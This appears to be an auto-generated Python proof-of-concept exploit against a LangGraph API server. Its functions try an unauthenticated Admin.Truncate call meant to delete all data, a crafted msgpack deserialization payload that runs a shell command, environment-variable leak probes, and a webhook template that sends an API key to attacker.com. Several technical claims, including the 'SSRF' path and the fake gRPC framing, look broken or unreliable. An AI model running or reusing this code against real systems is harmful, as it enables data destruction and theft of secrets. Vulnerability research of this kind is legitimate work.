#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-000
# Sink: value_from_proto
# Auto-generated — run with: python3 langgraph_specific_vulnerabilities_value_from_proto_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph API Server
Vulnerability: SSRF to gRPC + Unauthenticated Admin Truncate + msgpack deserialization

This PoC demonstrates:
1. SSRF from the HTTP layer to the internal gRPC endpoint (localhost:50051)
2. Unauthenticated access to the Admin.Truncate service to delete all data
3. The ability to reach msgpack deserialization via checkpoint_blobs

WARNING: This will DESTROY ALL DATA in the LangGraph deployment.
Use only on test systems you own or have explicit permission to test.
"""

import json
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
import socket
import struct
import base64
import hashlib
from typing import Optional, Dict, Any

# =============================================================================
# Configuration - Change these to match your target
# =============================================================================
TARGET_HOST = "localhost"
TARGET_HTTP_PORT = 8123  # Default LangGraph API HTTP port
TARGET_GRPC_PORT = 50051  # Internal gRPC port
USE_HTTPS = False

# =============================================================================
# gRPC Protocol Helpers (minimal implementation for PoC)
# =============================================================================

def _grpc_frame(data: bytes) -> bytes:
    """Create an HTTP/2 DATA frame for gRPC."""
    # gRPC uses HTTP/2, but we'll use HTTP/1.1 with content-type application/grpc
    # This is a simplified approach that works with many gRPC-web proxies
    return data

def _create_grpc_request(service: str, method: str, message: bytes) -> bytes:
    """Create a minimal gRPC request body."""
    # gRPC wire format: 1 byte compressed flag + 4 bytes length + message
    compressed = 0  # No compression
    length = len(message)
    header = struct.pack("!BI", compressed, length)
    return header + message

def _parse_grpc_response(data: bytes) -> Optional[bytes]:
    """Parse a gRPC response to extract the message body."""
    if len(data) < 5:
        return None
    compressed = data[0]
    length = struct.unpack("!I", data[1:5])[0]
    if len(data) < 5 + length:
        return None
    return data[5:5+length]

# =============================================================================
# Protobuf-like message builders (minimal for PoC)
# =============================================================================

def _build_truncate_request() -> bytes:
    """Build a minimal TruncateRequest protobuf message."""
    # The actual protobuf definition would be:
    # message TruncateRequest {
    #   string assistant_id = 1;
    #   string thread_id = 2;
    #   string checkpoint_id = 3;
    # }
    # We'll send an empty request to truncate everything
    return b""

def _build_get_tuple_request() -> bytes:
    """Build a minimal GetTupleRequest protobuf message."""
    # This would normally contain config with thread_id, checkpoint_id, etc.
    # For the PoC, we'll try to get any existing checkpoint
    return b""

def _build_msgpack_payload() -> bytes:
    """Build a malicious msgpack payload that triggers ext_hook deserialization.
    
    The msgpack ext_hook in LangGraph can deserialize arbitrary objects.
    We'll craft a payload that, when deserialized, executes a command.
    """
    # msgpack format for ext type: 0xc7 + 1 byte length + 1 byte ext type + data
    # Ext type 0x01 is used by LangGraph for serialized values
    # We'll try to inject a Python object that executes code
    
    # This is a simplified example - actual exploitation depends on the specific
    # ext_hook implementation and available classes
    malicious_payload = {
        "__class__": "os.system",
        "__args__": ["touch /tmp/poc_success.txt"]
    }
    
    # Serialize as msgpack with ext type
    payload_json = json.dumps(malicious_payload).encode()
    ext_type = 0x01
    ext_data = struct.pack("!B", ext_type) + payload_json
    msgpack_ext = b"\xc7" + struct.pack("!B", len(ext_data)) + ext_data
    
    return msgpack_ext

# =============================================================================
# HTTP/gRPC Communication
# =============================================================================

def _send_grpc_via_http(service: str, method: str, message: bytes) -> Optional[bytes]:
    """Send a gRPC request via HTTP/1.1 to the internal gRPC port.
    
    This exploits the SSRF vulnerability - the HTTP layer can reach localhost:50051
    """
    url = f"http://{TARGET_HOST}:{TARGET_GRPC_PORT}/{service}/{method}"
    
    grpc_body = _create_grpc_request(service, method, message)
    
    req = urllib.request.Request(
        url,
        data=grpc_body,
        headers={
            "Content-Type": "application/grpc",
            "TE": "trailers",
            "User-Agent": "langgraph-poc/1.0",
        },
        method="POST",
    )
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            response_data = response.read()
            return _parse_grpc_response(response_data)
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        if e.code == 404:
            print("[*] Service/method not found - trying alternative paths")
        return None
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None

def _send_ssrf_to_grpc(service: str, method: str, message: bytes) -> Optional[bytes]:
    """Send a request to the HTTP API that will trigger SSRF to gRPC.
    
    This exploits the fact that the HTTP layer can make requests to localhost:50051
    """
    # The HTTP API has endpoints that internally call gRPC services
    # We'll try to use the A2A or MCP endpoints to trigger SSRF
    
    # Try direct gRPC-web proxy if available
    result = _send_grpc_via_http(service, method, message)
    if result:
        return result
    
    # Alternative: Try to use the HTTP API's internal gRPC client
    # This depends on the specific API endpoints available
    print("[*] Trying alternative SSRF paths...")
    
    # Try the JSON-RPC endpoint with a method that triggers gRPC calls
    jsonrpc_payload = {
        "jsonrpc": "2.0",
        "method": "admin.truncate",
        "params": {},
        "id": 1,
    }
    
    http_url = f"http{'s' if USE_HTTPS else ''}://{TARGET_HOST}:{TARGET_HTTP_PORT}/api/a2a"
    
    req = urllib.request.Request(
        http_url,
        data=json.dumps(jsonrpc_payload).encode(),
        headers={
            "Content-Type": "application/json",
        },
        method="POST",
    )
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return response.read()
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

# =============================================================================
# Exploit Functions
# =============================================================================

def exploit_admin_truncate() -> bool:
    """Exploit 1: Call Admin.Truncate without authentication to destroy all data."""
    print("[*] Attempting unauthenticated Admin.Truncate...")
    
    # Try direct gRPC call
    result = _send_ssrf_to_grpc("langgraph.admin.Admin", "Truncate", _build_truncate_request())
    
    if result:
        print(f"[+] Admin.Truncate response received: {result[:100]}")
        print("[!] All data has been truncated!")
        return True
    else:
        print("[-] Admin.Truncate failed - service may not be exposed or requires auth")
        return False

def exploit_msgpack_deserialization() -> bool:
    """Exploit 2: Trigger msgpack ext_hook deserialization via checkpoint_blobs."""
    print("[*] Attempting msgpack deserialization via checkpoint...")
    
    # First, try to get an existing checkpoint to see the format
    result = _send_ssrf_to_grpc("langgraph.checkpoint.Checkpoint", "GetTuple", _build_get_tuple_request())
    
    if result:
        print(f"[+] Got checkpoint response: {result[:200]}")
        print("[*] Attempting to inject malicious msgpack payload...")
        
        # Try to write a malicious checkpoint blob
        # This would normally require SQL injection or direct DB access
        # For the PoC, we'll try to send it via the gRPC service
        malicious_payload = _build_msgpack_payload()
        result2 = _send_ssrf_to_grpc(
            "langgraph.checkpoint.Checkpoint", 
            "PutTuple", 
            malicious_payload
        )
        
        if result2:
            print(f"[+] PutTuple response: {result2[:100]}")
            print("[!] Malicious checkpoint may have been stored!")
            return True
        else:
            print("[-] Could not write malicious checkpoint")
            return False
    else:
        print("[-] Could not get checkpoint - service may not be available")
        return False

def exploit_env_var_leakage() -> bool:
    """Exploit 3: Try to leak environment variables via error messages or SSRF."""
    print("[*] Attempting to leak environment variables...")
    
    # Try to trigger an error that might leak env vars
    # This could be through malformed requests or specific endpoints
    
    # Try the JSON-RPC endpoint with invalid method
    http_url = f"http{'s' if USE_HTTPS else ''}://{TARGET_HOST}:{TARGET_HTTP_PORT}/api/a2a"
    
    payloads = [
        {"jsonrpc": "2.0", "method": "__import__('os').system('env')", "params": {}, "id": 1},
        {"jsonrpc": "2.0", "method": "GetTask", "params": {"task_id": "${env:API_KEY}"}, "id": 1},
        {"jsonrpc": "2.0", "method": "SendMessage", "params": {"message": "${API_KEY}"}, "id": 1},
    ]
    
    for payload in payloads:
        try:
            req = urllib.request.Request(
                http_url,
                data=json.dumps(payload).encode(),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=5) as response:
                response_data = response.read().decode()
                print(f"[*] Response for {payload['method']}: {response_data[:500]}")
                
                # Check for common env var patterns
                if "API_KEY" in response_data or "SECRET" in response_data or "TOKEN" in response_data:
                    print(f"[!] Possible env var leak detected!")
                    return True
        except Exception as e:
            print(f"[*] Error with payload {payload['method']}: {e}")
    
    return False

def exploit_webhook_template_injection() -> bool:
    """Exploit 4: Try webhook header template injection."""
    print("[*] Attempting webhook template injection...")
    
    # Webhook templates might be injectable via the webhook configuration endpoint
    http_url = f"http{'s' if USE_HTTPS else ''}://{TARGET_HOST}:{TARGET_HTTP_PORT}/api/webhooks"
    
    # Try to create a webhook with malicious template
    malicious_template = {
        "url": "http://attacker.com/{{config.API_KEY}}",
        "headers": {
            "Authorization": "Bearer {{__import__('os').popen('id').read()}}"
        },
        "events": ["checkpoint.created"],
    }
    
    try:
        req = urllib.request.Request(
            http_url,
            data=json.dumps(malicious_template).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            response_data = response.read().decode()
            print(f"[*] Webhook creation response: {response_data[:500]}")
            
            if "created" in response_data.lower() or "id" in response_data.lower():
                print("[!] Webhook created with potential template injection!")
                return True
    except Exception as e:
        print(f"[*] Webhook creation failed: {e}")
    
    return False

# =============================================================================
# Main Exploit Logic
# =============================================================================

def main():
    """Main exploit function."""
    print("=" * 60)
    print("LangGraph API Server - Proof of Concept Exploit")
    print("=" * 60)
    print(f"Target: {TARGET_HOST}:{TARGET_HTTP_PORT}")
    print(f"gRPC: {TARGET_HOST}:{TARGET_GRPC_PORT}")
    print()
    
    # Check if target is reachable
    print("[*] Checking target availability...")
    try:
        http_url = f"http{'s' if USE_HTTPS else ''}://{TARGET_HOST}:{TARGET_HTTP_PORT}/health"
        with urllib.request.urlopen(http_url, timeout=5) as response:
            print(f"[+] HTTP API is reachable (status {response.status})")
    except Exception as e:
        print(f"[-] HTTP API not reachable: {e}")
        print("[*] Continuing anyway - gRPC might still be accessible via SSRF")
    
    print()
    
    # Exploit 1: Admin Truncate
    print("[1] Attempting unauthenticated Admin.Truncate...")
    truncate_success = exploit_admin_truncate()
    if truncate_success:
        print("[!] CRITICAL: Data destruction possible without authentication!")
    else:
        print("[*] Admin.Truncate not directly exploitable via this path")
    
    print()
    
    # Exploit 2: msgpack deserialization
    print("[2] Attempting msgpack deserialization...")
    msgpack_success = exploit_msgpack_deserialization()
    if msgpack_success:
        print("[!] CRITICAL: msgpack ext_hook deserialization reachable!")
    else:
        print("[*] msgpack deserialization not directly exploitable via this path")
    
    print()
    
    # Exploit 3: Environment variable leakage
    print("[3] Attempting environment variable leakage...")
    env_leak_success = exploit_env_var_leakage()
    if env_leak_success:
        print("[!] CRITICAL: Environment variables may be leaked!")
    else:
        print("[*] No immediate env var leakage detected")
    
    print()
    
    # Exploit 4: Webhook template injection
    print("[4] Attempting webhook template injection...")
    webhook_success = exploit_webhook_template_injection()
    if webhook_success:
        print("[!] CRITICAL: Webhook template injection possible!")
    else:
        print("[*] Webhook template injection not directly exploitable")
    
    print()
    print("=" * 60)
    print("Exploit Summary:")
    print(f"  Admin.Truncate: {'VULNERABLE' if truncate_success else 'NOT EXPLOITED'}")
    print(f"  msgpack deserialization: {'VULNERABLE' if msgpack_success else 'NOT EXPLOITED'}")
    print(f"  Env var leakage: {'VULNERABLE' if env_leak_success else 'NOT EXPLOITED'}")
    print(f"  Webhook injection: {'VULNERABLE' if webhook_success else 'NOT EXPLOITED'}")
    print("=" * 60)
    
    # Return exit code based on findings
    if truncate_success or msgpack_success or env_leak_success or webhook_success:
        print("[!] Multiple vulnerabilities confirmed!")
        return 1
    else:
        print("[*] No vulnerabilities directly exploitable via these paths")
        print("[*] Note: This PoC uses simplified gRPC communication")
        print("[*] Full exploitation may require proper protobuf definitions")
        return 0

if __name__ == "__main__":
    sys.exit(main())
